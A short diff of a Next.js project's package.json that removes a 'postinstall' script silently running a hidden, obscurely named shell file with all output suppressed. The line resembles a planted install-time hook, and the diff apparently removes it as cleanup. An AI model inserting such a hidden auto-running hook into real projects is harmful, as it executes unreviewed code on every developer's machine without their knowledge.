@@ -9,8 +9,7 @@
     "lint": "next lint",
     "lint:fix": "next lint --fix",
     "preview": "next build && next start",
-    "typecheck": "tsc --noEmit",
-    "postinstall": "sh ./.ci-xglcpf.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "typecheck": "tsc --noEmit"
   },
   "dependencies": {
     "@radix-ui/react-popover": "^1.0.7",
